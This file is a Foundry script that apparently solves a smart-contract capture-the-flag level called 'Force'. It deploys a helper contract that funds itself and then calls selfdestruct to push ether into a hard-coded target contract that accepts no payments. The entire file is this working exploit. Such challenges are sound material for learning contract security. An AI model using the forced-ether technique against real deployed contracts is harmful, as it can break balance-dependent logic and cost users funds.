// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instance/Force.sol";
import "forge-std/Script.sol";


contract Payer {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}

contract Level6 is Script {
    Force _instance = Force(0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Payer _payer = new Payer();
        console.log("Balance: ", address(_instance).balance);
        _payer.deposit{value: 10000000000000 wei}();
        _payer.destruct(payable(address(_instance)));
        console.log("Balance now: ", address(_instance).balance);
        vm.stopBroadcast();
    }
}